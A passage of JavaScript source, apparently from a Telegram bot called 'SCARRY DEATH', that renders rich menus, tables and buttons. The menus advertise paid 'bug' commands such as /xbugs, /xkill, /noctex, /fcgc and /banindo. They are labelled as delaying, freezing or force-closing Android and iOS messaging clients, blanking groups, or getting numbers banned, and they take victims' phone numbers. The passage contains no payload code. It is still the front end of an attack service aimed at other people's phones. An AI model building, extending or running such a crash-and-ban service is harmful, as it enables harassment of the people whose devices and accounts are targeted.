    const monitor=take(b=>b.callback_data==='sadap');
    if(settings && tools && monitor) rows.push([settings,tools,monitor]);
    else for(const b of [monitor,tools,settings].filter(Boolean)) rest.unshift(b);

    // OWNER dan CHANNEL merupakan footer (baris terakhir), tidak ikut diselipkan ke menu tengah.
    const owner=take(b=>/\/callmymell\b/i.test(clean(b.url)) || /\bOWNER\b/i.test(tidyMenuLabel(b.text,b)));
    const channel=take(b=>/\/MakloehF\b/i.test(clean(b.url)) || /\bCHANNEL\b/i.test(tidyMenuLabel(b.text,b)));
    for(let i=0;i<rest.length;i+=3) rows.push(rest.slice(i,i+3));
    if(owner || channel) rows.push([owner,channel].filter(Boolean));
  } else {
    // Submenu tidak diurutkan ulang; semuanya tetap dapat diklik.
    for(let i=0;i<rest.length;i+=3) rows.push(rest.slice(i,i+3));
  }
  return rows;
}
function nativeMenuMarkup(markup) {
  const rows=rowsOfThree(markup);
  return rows ? {...markup,inline_keyboard:rows.map(row=>row.map(b=>({...b,text:tidyMenuLabel(b.text,b),
    // Jangan mengubah callback_data, web_app, URL, atau nilai lainnya.
    icon_custom_emoji_id:row.length>=3?undefined:b.icon_custom_emoji_id
  })))} : markup;
}
function convertButtons(markup,{richIcons=true}={}) {
  const rows=rowsOfThree(markup);
  if(!rows) return {html:'',keepMarkup:!!markup,converted:0};
  const htmlRows=[];
  let count=0;
  for(const row of rows){
    const parts=[];
    for(const b of row){
      let type, attributes='';
      if(b.callback_data!=null) {type='callback_data';attributes=attr('data',b.callback_data);}
      else if(typeof b.url==='string') {type='url';attributes=attr('url',b.url);}
      else if(b.copy_text?.text!=null) {type='copy_text';attributes=attr('text',b.copy_text.text);}
      else if(b.web_app?.url) {type='web_app';attributes=attr('url',b.web_app.url);}
      else if(b.switch_inline_query_current_chat!=null) {type='switch_inline_query_current_chat';attributes=attr('query',b.switch_inline_query_current_chat);}
      else if(b.switch_inline_query!=null) {type='switch_inline_query';attributes=attr('query',b.switch_inline_query);}
      else if(b.switch_inline_query_chosen_chat?.query!=null) {
        type='switch_inline_query_chosen_chat';attributes=attr('query',b.switch_inline_query_chosen_chat.query);
        for(const [k,name] of [['allow_user_chats','allow-user-chats'],['allow_bot_chats','allow-bot-chats'],['allow_group_chats','allow-group-chats'],['allow_channel_chats','allow-channel-chats']]) if(b.switch_inline_query_chosen_chat[k]) attributes+=' '+name;
      } else if(b.login_url?.url){type='login_url';attributes=attr('url',b.login_url.url);}
      else return {html:'',keepMarkup:true,converted:0};
      const style=allowedStyle(b.style);
      const styleAttr=style&&!(style==='link'&&type!=='callback_data')?attr('style',style):'';
      const id=/^\d{12,22}$/.test(clean(b.icon_custom_emoji_id))?clean(b.icon_custom_emoji_id):DEFAULT_EMOJI['✨'];
      // 3 tombol: tanpa icon agar tidak dibungkus ulang di layar iPhone.
      // MURBUG tunggal serta OWNER/CHANNEL tetap punya emoji premium.
      const icon=richIcons&&row.length<3?`<tg-emoji emoji-id="${id}">✨</tg-emoji> `:'';
      parts.push(`<tg-button type="${type}"${styleAttr}${attributes}>${icon}${escapeHtml(tidyMenuLabel(b.text,b))}</tg-button>`);
      count++;
    }
    htmlRows.push(`<tg-button-row align="center">${parts.join('')}</tg-button-row>`);
  }
  return {html:htmlRows.join('\n'),keepMarkup:false,converted:count};
}
function menuHtml(caption, mode='HTML', photo=null) {
  const raw=clean(caption).trim();
  if (raw === 'BUGS MENU') return '<h2>BUGS MENU</h2>\n<hr/>\n';
  if (/^BUGS ANTI KENON MENU(?:\r?\n|$)/i.test(raw)) {
    const rows = SCARRY_ANTI_COMMANDS.filter(cmd => !['/lockchat', '/banindo'].includes(cmd)).map(cmd =>
      `<tr><td><code>${escapeHtml(cmd)}</code></td><td><code>+628xxx</code></td><td>ANTI BANNED 100%</td></tr>`
    ).join('\n');
    const image = typeof photo === 'string' && /^https:\/\//i.test(photo)
      ? `<figure><img src="${escapeHtml(photo)}"/></figure>\n` : '';
    return image + '<h2>BUGS ANTI KENON MENU</h2>\n' +
      '<h3>DAFTAR COMMAND</h3>\n' +
      '<table bordered striped compact><tr><th>COMMAND</th><th>EXAMPLE</th><th>TYPE</th></tr>' +
      rows + '</table>\n<hr/>\n';
  }
  if (/^BUGS RAWAN BAND MENU(?:\r?\n|$)/i.test(raw)) {
    const image = typeof photo === 'string' && /^https:\/\//i.test(photo)
      ? `<figure><img src="${escapeHtml(photo)}"/></figure>\n` : '';
    return image + '<h2>BUGS RAWAN BAND MENU</h2>\n' +
      '<h3>DAFTAR COMMAND</h3>\n' +
      '<p><code>/lockchat</code></p>\n' +
      '<p><code>/banindo</code></p>\n<hr/>\n';
  }
  const source=raw.replace(/<\/?blockquote(?:\s[^>]*)?>/gi,'')
    .split(/\r?\n/).map(line=>line.trim()).filter(Boolean).filter(line=>!/^```/.test(line));
  const strip = v => clean(v)
    .replace(/<tg-emoji\b[^>]*>[\s\S]*?<\/tg-emoji>/gi,' ')
    .replace(/<[^>]*>/g,' ').replace(/&(?:amp|lt|gt|quot|apos);/gi,' ')
    .normalize('NFKC').replace(/\s+/g,' ').trim();
  const isHome = source.some(line=>/System Name\s*:/i.test(strip(line))) && source.some(line=>/Private Edition|Stealth Edition/i.test(strip(line)));
  const image = typeof photo==='string' && /^https:\/\//i.test(photo)
    ? `<figure><img src="${escapeHtml(photo)}"/></figure>` : '';
  const names=['System Name','Version','Developer','Mode','Date','Today','Runtime','Status','Server','Total','Sender Terhubung','Sender Tidak Terhubung','Total Sender'];
  const fields=[];
  const textLines=[];
  const commands=[];
  const menuTips=[];
  const isMurbug = source.some(line => /MURBUG\s*[•·]\s*(?:VVVIP|VVIP)\s+ACCESS/i.test(strip(line)));
  let currentEffectType = 'GENERAL';
  // V28: klasifikasi TAMPILAN SAJA; tidak mengubah izin atau menjalankan command.
  const murbugDisplayTypes = Object.freeze({
    '/xbugs': 'DELAY X FREZE INVIS',
    '/xkill': 'DELAY X FREZE INVIS',
    '/xynerx': 'DELAY X FREZE INVIS',
    '/zypherx': 'DELAY X FREZE INVIS',
    '/xivorx': 'DELAY X FREZE INVIS',
    '/noctex': 'Forclose Ios',
    '/qexon': 'Forclose Ios',
    '/fcgc': 'FORCLOSE ONLY GROUP',
    '/frezegc': 'FREZE ONLY GROUP',
    '/blankgc': 'BLANK ONLY GROUP'
  });
  const murbugTipNames = new Set(['/aktif','/nonaktif','/aktifall','/resetall','/cmd']);
  const seen = new Set();
  let menuTitle=isMurbug ? 'SCARRY DEATH • MURBUG' : 'SCARRY DEATH';
  function safeRichLine(line) {
    const tokens=[];
    let escaped=clean(line).replace(/<tg-emoji\b([^>]*)>([\s\S]*?)<\/tg-emoji>/gi,(match,attrs,alt)=>{
      const m=/emoji-id\s*=\s*["'](\d{12,22})["']/.exec(attrs);
      if (!m) return alt;
      const marker='SCARRYRICHEMOJIMARKER'+tokens.length+'END';
      tokens.push(`<tg-emoji emoji-id="${m[1]}">${escapeHtml(strip(alt)||'✨')}</tg-emoji>`);
      return marker;
    });
    escaped=escaped.replace(/<\/?(?:b|strong|i|em|blockquote|a|code|pre|span|u|s|hr|p)\b[^>]*>/gi,'');
    escaped=addPremiumEmojiToHtml(escapeHtml(escaped));
    return escaped.replace(/SCARRYRICHEMOJIMARKER(\d+)END/g,(_,n)=>tokens[Number(n)]||'');
  }
  for (const line of source.slice(0,220)) {
    const plain=strip(line);
    if (!plain) continue;
    const field=names.find(n=>new RegExp('^'+n.replace(/\s+/g,'\\s+')+'\\s*:', 'i').test(plain));
    if (field) {
      const value=plain.replace(new RegExp('^'+field.replace(/\s+/g,'\\s+')+'\\s*:\s*', 'i'),'');
      fields.push([field,value.trim().replace(/^['"\s]+|['"\s]+$/g,'')]);
      continue;
    }
    // Kategori diambil dari deskripsi menu ASLI, bukan menebak efek command.
    if (isMurbug && /\bAndroid\b/i.test(plain) && !/\/[a-z]/i.test(plain)) {
      currentEffectType='ANDROID';
      continue;
    }
    if (isMurbug && /\biOS\b/i.test(plain) && !/\/[a-z]/i.test(plain)) {
      currentEffectType='iOS';
      continue;
    }
    // Parser ini HANYA mengatur tampilan tabel; tidak membuat handler command.
    const cm=plain.match(/(?:^|\s)\/([a-zA-Z][\w-]*)(.*)$/);
    if (cm) {
      const name='/'+cm[1];
      const description=cm[2].replace(/^[\s\-—:]+/,'').replace(/^\[|\]$/g,'').replace(/^[^\p{L}\p{N}/]+/gu,'').trim();
      if (isMurbug) {
        // Hilangkan command Android-only yang sudah dipensiunkan dari tabel Rich.
        if (SCARRY_RETIRED_ANDROID_EFFECTS.has(name.toLowerCase())) continue;
        if (murbugTipNames.has(name.toLowerCase())) {
          menuTips.push([name,description]);
        } else if (!seen.has(name.toLowerCase())) {
          const effekType=murbugDisplayTypes[name.toLowerCase()]||currentEffectType;
          const example=['/fcgc','/frezegc','/blankgc','/lockgc'].includes(name.toLowerCase())?'Grup':(description||'628xxxx');
          commands.push([name,effekType,example]);
          seen.add(name.toLowerCase());
        }
      } else {
        commands.push([name,description||'Fitur tersedia']);
      }
      continue;
    }
    if (!isHome && menuTitle==='SCARRY DEATH' && /MENU|CONTROL|SETTINGS|TOOLS|INFORMASI|PANEL|SESSION/i.test(plain) && plain.length<115) {
      menuTitle=plain.replace(/^[#\-\s༄『「╭⟬]+/gu,'').replace(/[༄』」╯⟭\s]+$/gu,'').slice(0,74)||menuTitle;
      continue;
    }
    // Avoid duplicate prose in title or table and noisy ASCII separators.
    if (/^[─━═\-╴╶\s]{5,}$/u.test(plain)) continue;
    textLines.push(line);
  }
  const renderTable=(headers,rows,maxRows=80)=>{
    const head='<tr>'+headers.map(h=>`<th>${escapeHtml(h)}</th>`).join('')+'</tr>';
    let result='<table bordered striped compact>'+head;
    for(const r of rows.slice(0,maxRows)) result+='<tr>'+r.map(x=>`<td>${escapeHtml(x)}</td>`).join('')+'</tr>';
    return result+'</table>';
  };
  const parts=[];
  // Put photo FIRST. No more detached plain title above the image.
  if(image) parts.push(image);
  parts.push(`<h2>${isHome?'SCARRY DEATH • PRIVATE EDITION':escapeHtml(menuTitle)}</h2>`);
  if(isHome) {
    // Compact premium intro + proper Rich info table, rather than a wall of plain text.
    parts.push('<blockquote><b>SCARRY DEATH • NEW VERSION</b><i>The shadows speak, and we listen.</i></blockquote>');
    parts.push('<p><tg-emoji emoji-id="6206323928512602557">✨</tg-emoji> Selamat datang di SCARRY DEATH. Pilih fitur lewat tombol Rich di bawah.</p>');
    parts.push(`<h3><tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> CORE PREMIUM SYSTEM</h3>`);
    if(fields.length) parts.push(renderTable(['Informasi','Detail'],fields));
  } else {
    const top=[];
    for(const line of textLines) {
      if (/^一緒|^༒|^「|^"一緒|^##|^#-/u.test(strip(line))) continue;
      top.push(safeRichLine(line));
      if (top.length >= (commands.length ? 2 : 8)) break;
    }
    if(isMurbug) {
      parts.push('<blockquote><tg-emoji emoji-id="6206323928512602557">✨</tg-emoji> <b>MURBUG • VVVIP ACCESS</b>\nDaftar command dikelompokkan sesuai kategori Android dan iOS.</blockquote>');
    } else if(top.length) parts.push('<blockquote>'+top.join('\n')+'</blockquote>');
    if(fields.length) parts.push(renderTable(['Informasi','Detail'],fields));
    if(commands.length) {
      parts.push(`<h3><tg-emoji emoji-id="6206323928512602557">✨</tg-emoji> DAFTAR COMMAND</h3>`);
      if(isMurbug) {
        parts.push('<p><b>Format:</b> Command • Effek Type • Example</p>');
        parts.push(renderTable(['COMMAND','EFFEK TYPE','EXAMPLE'],commands,90));
        if(menuTips.length) {
          parts.push('<h3><tg-emoji emoji-id="4936468614967460670">⭐</tg-emoji> PANDUAN MENU</h3>');
          parts.push(renderTable(['PENGATURAN','KETERANGAN'],menuTips,12));
        }
      } else {
        parts.push(renderTable(['Command','Keterangan'],commands,90));
      }
    } else {
      const remaining=textLines.slice(top.length).filter(x=>strip(x));
      for(const line of remaining.slice(0,50)) parts.push(`<p>${safeRichLine(line)}</p>`);
    }
    if(!fields.length && !commands.length && !textLines.length) parts.push('<p>Pilih tombol Rich untuk membuka fitur.</p>');
  }
  parts.push('<hr/>');
  // Do not truncate in the middle of an HTML tag. Telegram may reject overlong Rich payloads.
  let result='';
  for(const part of parts) {
    if(result.length+part.length>25000) break;
    result+=part+'\n';
  }
  return result;
}
function textToRich(text, opts = {}) {
  let html = '';
  const mode = clean(opts.parse_mode).toLowerCase();
  if (mode === 'html') html = addPremiumEmojiToHtml(clean(text));
  else if (mode === 'markdown' || mode === 'markdownv2') {
    return { markdown: clean(text) }; // Rich Markdown permits embedded custom HTML from original messages.
  } else {
    const src = addPremiumEmojiToHtml(escapeHtml(text));
    // Preserve plain text faithfully, but visually group paragraphs and headings.
    const paragraphs = src.split(/\n\s*\n/g).filter(Boolean);
    if (!paragraphs.length) html = '<p> </p>';
    else html = paragraphs.map((p, i) => {
      const lines = p.split('\n');
      if (i === 0 && lines.length === 1 && lines[0].length < 90 &&
          /^(?:[^a-z]*[A-Z][^a-z]*)$/.test(lines[0]) && /[A-Z]/.test(lines[0])) {
        return `<h3>${p}</h3>`;
      }
      return `<p>${p}</p>`;
    }).join('\n');
  }
  return { html };
}

function buildRich(text, opts, richIcons = true) {
  const body = textToRich(text, opts);
  const buttons = convertButtons(opts.reply_markup, { richIcons });
  const rich = body.markdown
    ? { markdown: body.markdown + (buttons.html ? '\n' + buttons.html : '') }
    : { html: body.html + (buttons.html ? '\n' + buttons.html : '') };
  return { rich, buttons };
}

function requestOptions(chatId, opts, built) {
  const p = { chat_id: chatId, rich_message: built.rich };
  for (const k of ['message_thread_id','direct_messages_topic_id','disable_notification','protect_content','allow_paid_broadcast','message_effect_id','business_connection_id']) {
    if (opts[k] != null) p[k] = opts[k];
  }
  if (opts.reply_parameters) p.reply_parameters = opts.reply_parameters;
  else if (opts.reply_to_message_id) p.reply_parameters = { message_id: opts.reply_to_message_id, allow_sending_without_reply: opts.allow_sending_without_reply !== false };
  if (built.buttons.keepMarkup && opts.reply_markup) p.reply_markup = opts.reply_markup;
  return p;
}

function errorDescription(err) {
  return clean(err?.response?.data?.description || err?.response?.body?.description || err?.message || err).slice(0, 160);
}
function isPermanent(err) {
  const status = err?.response?.status ?? err?.response?.statusCode;
  return status === 400 || status === 404 || /^ETELEGRAM: 400/.test(clean(err.message));
}

function installScarryRich(bot, token, options = {}) {
  if (!bot || typeof bot.sendMessage !== 'function') throw new Error('Telegram bot instance required');
  if (bot.__scarryRichInstalled) return bot.__scarryRichInstalled;
  const axios = options.axios || (options.transport ? null : require('axios'));
  const originals = {
    sendMessage: bot.sendMessage.bind(bot),
    sendPhoto: typeof bot.sendPhoto === 'function' ? bot.sendPhoto.bind(bot) : null,
    editMessageText: bot.editMessageText.bind(bot),
    editMessageCaption: typeof bot.editMessageCaption === 'function' ? bot.editMessageCaption.bind(bot) : null,
    editMessageMedia: typeof bot.editMessageMedia === 'function' ? bot.editMessageMedia.bind(bot) : null,
    editMessageReplyMarkup: typeof bot.editMessageReplyMarkup === 'function' ? bot.editMessageReplyMarkup.bind(bot) : null
  };
  const richMessages = new Set();
  const richStates = new Map();
  const MAX_SEEN = 1000;
  const warningTypes = new Set();
  const base = `https://api.telegram.org/bot${token}`;
  const transport = options.transport || (async (method, payload) => {
    const res = await axios.post(`${base}/${method}`, payload, { timeout: 10000 });
    if (!res.data?.ok) throw Object.assign(new Error(res.data?.description || `${method} failed`), { response: { status: 400, data: res.data } });
    return res.data.result;
  });
  function remember(chatId, msg, state) {
    if (!msg?.message_id) return;
    const k = `${chatId}:${msg.message_id}`;
    richMessages.add(k);
    if (state) richStates.set(k, state);
    if (richMessages.size > MAX_SEEN) {
      const oldest = richMessages.values().next().value;
      richMessages.delete(oldest);
      richStates.delete(oldest);
    }
  }
  function warn(type, e) {
    const descr = errorDescription(e);
    const key = type + ':' + descr;
    if (!warningTypes.has(key)) {
      console.warn(`[SCARRY RICH ${type}] ${descr}`);
      warningTypes.add(key);
    }
  }

  async function sendMenu(chatId, caption, markup, photo, opts={}) {
    const buttons=convertButtons(markup);
    const html=menuHtml(caption, opts.parse_mode||'HTML', photo) + buttons.html;
    const payload = { chat_id:chatId, rich_message:{html} };
    if (opts.message_thread_id != null) payload.message_thread_id=opts.message_thread_id;
    if (opts.reply_to_message_id != null) payload.reply_parameters={message_id: opts.reply_to_message_id, allow_sending_without_reply:true};
    // If a Rich action is unsupported, preserve its original native keyboard.
    if (buttons.keepMarkup && markup) payload.reply_markup=nativeMenuMarkup(markup);
    try {
      const sent=await transport('sendRichMessage',payload);
      remember(chatId,sent,{kind:'menu',caption,opts,photo,markup});
      return sent;
    } catch (e) {
      if (!isPermanent(e)) throw e; // Uncertain network result: never send twice.
      warn('MENU FALLBACK',e);
      const keyboard=nativeMenuMarkup(markup);
      if (typeof photo==='string' && (/^https?:\/\//.test(photo)||/^[a-zA-Z0-9_-]{45,}$/.test(photo))) {
        return originals.sendPhoto(chatId,photo,{caption:clean(caption).replace(/<[^>]*>/g,'').slice(0,1000),reply_markup:keyboard});
      }
      return originals.sendMessage(chatId,clean(caption).replace(/<[^>]*>/g,'').slice(0,3900),{reply_markup:keyboard});
    }
  }

  async function send(chatId, text, opts = {}) {
    if (typeof text !== 'string' || opts?.disable_rich || opts?.entities || !token || text.length > 32000) {
      return originals.sendMessage(chatId, text, opts);
    }
    const options = opts || {};
    const built = buildRich(text, options);
    try {
      const msg = await transport('sendRichMessage', requestOptions(chatId, options, built));
      remember(chatId, msg, { kind: 'text', text, opts: options });
      return msg;
    } catch (e) {
      if (!isPermanent(e)) throw e; // Do not duplicate delivery when network state is ambiguous.
      if (/EMOJI|ENTITY/i.test(errorDescription(e)) && built.buttons.converted) {
        try {
          const simpler = buildRich(text, options, false);
          const msg = await transport('sendRichMessage', requestOptions(chatId, options, simpler));
          remember(chatId, msg, { kind: 'text', text, opts: options });
          return msg;
        } catch (second) { e = second; if (!isPermanent(e)) throw e; }
      }
      warn('FALLBACK', e);
      return originals.sendMessage(chatId, text, {...options, reply_markup: options.reply_markup?.inline_keyboard ? nativeMenuMarkup(options.reply_markup) : options.reply_markup});
    }
  }

  async function edit(text, opts = {}) {
    if (typeof text !== 'string' || !opts || opts.disable_rich || opts.entities) return originals.editMessageText(text, opts);
    const key = `${opts.chat_id}:${opts.message_id}`;
    if (!opts.inline_message_id && !richMessages.has(key)) return originals.editMessageText(text, opts);
    const built = buildRich(text, opts);
    const p = { rich_message: built.rich };
    for (const k of ['chat_id','message_id','inline_message_id','business_connection_id']) if (opts[k] != null) p[k] = opts[k];
    if (built.buttons.keepMarkup && opts.reply_markup) p.reply_markup = opts.reply_markup;
    try { const r = await transport('editMessageText', p); if (richStates.has(key)) richStates.set(key, { kind: 'text', text, opts }); return r; }
    catch (e) {
      if (!isPermanent(e)) throw e;
      warn('EDIT FALLBACK', e);
      return originals.editMessageText(text, opts);
    }
  }
  bot.sendMessage = send;
  bot.editMessageText = edit;

  const mediaTypes = { sendPhoto: 'img', sendVideo: 'video', sendAudio: 'audio', sendDocument: 'document' };
  for (const [method, tag] of Object.entries(mediaTypes)) {
    if (typeof bot[method] !== 'function') continue;
    const original = bot[method].bind(bot);
    bot[method] = async (chatId, media, opts = {}, fileOptions) => {
      if (!media || typeof media !== 'string' || !opts?.caption || opts.disable_rich || fileOptions) return original(chatId, media, opts, fileOptions);
      const isWeb = /^https?:\/\//i.test(media);
      const isTelegramFile = /^[A-Za-z0-9_-]{45,}$/.test(media);
      if (!isWeb && !isTelegramFile) return original(chatId, media, opts, fileOptions);
      // Rich HTML can reuse a previously uploaded file via tg://media?id=file_id.
      const src = isWeb ? media : `tg://${tag==='img'?'photo':tag}?id=${encodeURIComponent(media)}`;
      const content = textToRich(opts.caption, opts);
      const markup = convertButtons(opts.reply_markup);
      const html = `<${tag} src="${escapeHtml(src)}"/>\n` + (content.html || escapeHtml(opts.caption)) + '\n' + markup.html;
      const built = { rich: { html }, buttons: markup };
      try {
        const msg = await transport('sendRichMessage', requestOptions(chatId, opts, built));
        remember(chatId, msg, { kind: 'media', tag, src, caption: opts.caption, opts });
        return msg;
      } catch (e) {
        if (!isPermanent(e)) throw e;
        warn('MEDIA FALLBACK', e);
        return original(chatId, media, opts, fileOptions);
      }
    };
  }

  function buildFromState(state, newMarkup) {
    if (state.kind === 'text') return buildRich(state.text, { ...state.opts, reply_markup: newMarkup });
    const p = { ...state.opts, reply_markup: newMarkup };
    const caption = textToRich(state.caption || '', p);
    const buttons = convertButtons(newMarkup);
    const mediaBlock = `<${state.tag} src="${escapeHtml(state.src)}"/>`;
    return {
      rich: { html: `${mediaBlock}\n${caption.html || escapeHtml(state.caption || '')}\n${buttons.html}` },
      buttons
    };
  }
  async function updateRichState(chatId, messageId, state, markup) {
    const built = buildFromState(state, markup);
    const p = { chat_id: chatId, message_id: messageId, rich_message: built.rich };
    if (built.buttons.keepMarkup && markup) p.reply_markup = markup;
    const result = await transport('editMessageText', p);
    richStates.set(`${chatId}:${messageId}`, { ...state, opts: { ...state.opts, reply_markup: markup } });
    return result;
  }
  if (originals.editMessageCaption) {
    bot.editMessageCaption = async (caption, opts = {}) => {
      const k = `${opts.chat_id}:${opts.message_id}`;
      const state = richStates.get(k);
      if (!state || state.kind !== 'media' || typeof caption !== 'string') return originals.editMessageCaption(caption, opts);
      const next = { ...state, caption, opts: { ...state.opts, ...opts, parse_mode: opts.parse_mode || state.opts.parse_mode } };
      try { return await updateRichState(opts.chat_id, opts.message_id, next, opts.reply_markup || state.opts.reply_markup); }
      catch (e) {
        if (!isPermanent(e)) throw e;
        warn('CAPTION FALLBACK', e);
        return originals.editMessageCaption(caption, opts);
      }
    };
  }
  if (originals.editMessageMedia) {
    bot.editMessageMedia = async (media, opts = {}) => {
      const k = `${opts.chat_id}:${opts.message_id}`;
      const state = richStates.get(k);
      if (!state || state.kind !== 'media' || !media || typeof media.media !== 'string') return originals.editMessageMedia(media, opts);
      const tag = { photo:'img',video:'video',audio:'audio',document:'document' }[media.type] || state.tag;
      const url = /^https?:\/\//i.test(media.media) ? media.media :
        (/^[A-Za-z0-9_-]{45,}$/.test(media.media) ? `tg://${tag === 'img' ? 'photo' : tag}?id=${encodeURIComponent(media.media)}` : null);
      if (!url) return originals.editMessageMedia(media, opts);
      const next = { ...state, tag, src: url, caption: media.caption ?? state.caption,
        opts: { ...state.opts, ...media, parse_mode: media.parse_mode || state.opts.parse_mode } };
      try { return await updateRichState(opts.chat_id, opts.message_id, next, opts.reply_markup || state.opts.reply_markup); }
      catch (e) {
        if (!isPermanent(e)) throw e;
        warn('MEDIA EDIT FALLBACK', e);
        return originals.editMessageMedia(media, opts);
      }
    };
  }
  if (originals.editMessageReplyMarkup) {
    bot.editMessageReplyMarkup = async (markup, opts = {}) => {
      const k = `${opts.chat_id}:${opts.message_id}`;
      const state = richStates.get(k);
      // Identical markup is a no-op; Telegram would return MESSAGE_NOT_MODIFIED.
      if (state && JSON.stringify(state.opts?.reply_markup || null) === JSON.stringify(markup || null)) return true;
      if (!state) {
        try { return await originals.editMessageReplyMarkup(markup, opts); }
        catch(e) { if (/message is not modified/i.test(errorDescription(e))) return true; throw e; }
      }
      try { return await updateRichState(opts.chat_id, opts.message_id, state, markup); }
      catch (e) {
        if (/message is not modified/i.test(errorDescription(e))) return true;
        if (!isPermanent(e)) throw e;
        warn('BUTTON EDIT FALLBACK', e);
        try { return await originals.editMessageReplyMarkup(markup, opts); }
        catch(f) { if (/message is not modified/i.test(errorDescription(f))) return true; throw f; }
      }
    };
  }

  const api = { send, edit, sendMenu, menuHtml, convertButtons, rowsOfThree, nativeMenuMarkup, buildRich, requestOptions, originals, transport, richMessages, richStates };
  Object.defineProperty(bot, '__scarryRichInstalled', { value: api, configurable: false });
  return api;
}
return { installScarryRich, convertButtons, textToRich, buildRich };
})();
SCARRY_DEATH_RICH.installScarryRich(bot, BOT_TOKEN, { axios });
// ===== END RICH ADAPTER =====

// ===== RICH UI (PREVIEW + GENERAL PURPOSE, TANPA PENGIRIMAN PAYLOAD) =====
// Rich UI helper embedded in this file: no extra require or local helper file needed.
const SCARRY_SAFE_UI = (() => {
'use strict';

// UI-only module for informational Telegram messages and authorized workflows.
// Does not send WhatsApp messages or execute device-crashing payloads.

function escapeHtml(value) {
  return String(value == null ? '' : value)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function safeLink(url) {
  try {
    const parsed = new URL(String(url));
    return ['https:', 'http:'].includes(parsed.protocol) ? parsed.toString() : null;
  } catch { return null; }
}

function normalizePayload(payload) {
  if (!Array.isArray(payload)) payload = [payload];
  return payload.filter(value => value && typeof value === 'object' && !Array.isArray(value));
}

function formatRich(payload) {
  const elements = normalizePayload(payload);
  const rich = [];
  const fallback = [];
  const buttons = [];

  for (const item of elements) {
    if (item.h1 !== undefined) {
      rich.push(`<h1>${escapeHtml(item.h1)}</h1>`);
      fallback.push(`<b>✦ ${escapeHtml(item.h1)}</b>`);
    }
    if (item.h2 !== undefined) {
      rich.push(`<h2>${escapeHtml(item.h2)}</h2>`);
      fallback.push(`<b>${escapeHtml(item.h2)}</b>`);
    }
    if (item.p !== undefined) {
      const paragraphs = Array.isArray(item.p) ? item.p : [item.p];
      for (const line of paragraphs) {
        rich.push(`<p>${escapeHtml(line)}</p>`);
        fallback.push(escapeHtml(line));
      }
    }
    if (item.hr === true) {
      rich.push('<hr/>');
      fallback.push('━━━━━━━━━━━━━━━━━━━━');
    }
    for (const type of ['img', 'video']) {
      if (!item[type] || typeof item[type] !== 'object') continue;
      const mediaUrl = safeLink(item[type].src);
      if (!mediaUrl) continue;
      const caption = escapeHtml(item[type].caption || (type === 'img' ? 'Gambar' : 'Video'));
      rich.push(`<${type} src="${escapeHtml(mediaUrl)}"${item[type].spoiler ? ' spoiler="true"' : ''}/>`);
      rich.push(`<p>${caption}</p>`);
      fallback.push(`<a href="${escapeHtml(mediaUrl)}">${type === 'img' ? '🖼️' : '🎥'} ${caption}</a>`);
    }
    if (item.table && typeof item.table === 'object') {
      const headers = Array.isArray(item.table.headers) ? item.table.headers : [];
      const rows = Array.isArray(item.table.rows) ? item.table.rows : [];
      rich.push('<table bordered striped compact>');
      if (headers.length) rich.push(`<tr>${headers.map(h => `<th>${escapeHtml(h)}</th>`).join('')}</tr>`);
      for (const row of rows.slice(0, 30)) {
        if (!Array.isArray(row)) continue;
        rich.push(`<tr>${row.map(value => `<td>${escapeHtml(value)}</td>`).join('')}</tr>`);
      }
      rich.push('</table>');
      fallback.push('<b>INFORMASI</b>');
      for (const row of rows.slice(0, 30)) {
        if (!Array.isArray(row)) continue;
        fallback.push(`• ${row.map((value, i) => i === 0 ? `<b>${escapeHtml(value)}</b>` : escapeHtml(value)).join(' — ')}`);
      }
    }
    if (item.details && typeof item.details === 'object') {
      const summary = escapeHtml(item.details.summary || 'Detail');
      const content = escapeHtml(item.details.content || '');
      rich.push(`<details${item.details.open ? ' open' : ''}><summary>${summary}</summary><p>${content}</p></details>`);
      fallback.push(`<blockquote><b>${summary}</b>\n${content}</blockquote>`);
    }
    if (Array.isArray(item.checkbox)) {
      const selected = item.checkbox.slice(0, 20);
      rich.push(`<p>${selected.map(row => `${row.checked ? '☑' : '☐'} ${escapeHtml(row.text)}`).join('<br/>')}</p>`);
      fallback.push(...selected.map(row => `${row.checked ? '✅' : '⬜'} ${escapeHtml(row.text)}`));
    }
    if (item.footer !== undefined) {
      rich.push(`<footer>${escapeHtml(item.footer)}</footer>`);
      fallback.push(`<i>${escapeHtml(item.footer)}</i>`);
    }
    if (Array.isArray(item.buttons)) {
      for (const line of item.buttons) {
        if (!Array.isArray(line)) continue;
        const newLine = line.map(btn => ({text: String(btn?.text || 'Open').slice(0, 64), url: safeLink(btn?.url)}))
          .filter(btn => btn.url).slice(0, 4);
        if (newLine.length) buttons.push(newLine);
      }
    }
  }
  // Rich transport's URL-buttons are embedded in HTML; native fallback uses a keyboard.
  for (const line of buttons) {
    rich.push(`<tg-button-row align="center">${line.map(b => `<tg-button type="url" url="${escapeHtml(b.url)}" text="${escapeHtml(b.text)}">${escapeHtml(b.text)}</tg-button>`).join('')}</tg-button-row>`);
  }
  return {
    html: rich.join('\n'),
    fallbackHtml: fallback.join('\n\n'),
    markup: buttons.length ? { inline_keyboard: buttons } : undefined
  };
}

function isPermanentRichError(error) {
  const status = error?.response?.status ?? error?.response?.statusCode;
  return status === 400 || status === 404 || /ETELEGRAM: (?:400|404)\b/i.test(String(error?.message || ''));
}

async function sendRich(bot, chatId, payload) {
  const card = formatRich(payload);
  if (bot.__scarryRichInstalled?.transport) {
    try {
      return await bot.__scarryRichInstalled.transport('sendRichMessage', {
        chat_id: chatId,
        rich_message: { html: card.html }
      });
    } catch (err) {
      // Network timeout may mean Telegram DID send. Never fallback on uncertain delivery.
      if (!isPermanentRichError(err)) throw err;
    }
  }
  // Native Telegram parse_mode doesn't support <table>, <h1>, <details>.
  // Use a separately rendered, Telegram-compatible fallback.
  const nativeSend = bot.__scarryRichInstalled?.originals?.sendMessage || bot.sendMessage.bind(bot);
  return nativeSend(chatId, card.fallbackHtml.slice(0, 3900), {
    parse_mode: 'HTML',
    disable_web_page_preview: true,
    ...(card.markup ? { reply_markup: card.markup } : {})
  });
}

function makeStatusCard(title, status, description, extraRows = []) {
  return [
    { h1: 'SCARRY DEATH' },
    { h2: title },
    { p: description },
    { table: { headers: ['INFORMASI', 'DETAIL'], rows: [['STATUS', status], ...extraRows] } },
    { hr: true },
    { footer: 'SCARRY DEATH • 42.0 Pro' }
  ];
}

// Safe single-flight deduplication for ordinary user-authorized operations.
// A repeat invocation joins the already-running job; it does NOT re-send.
class SingleFlight {
  constructor() { this.inFlight = new Map(); }
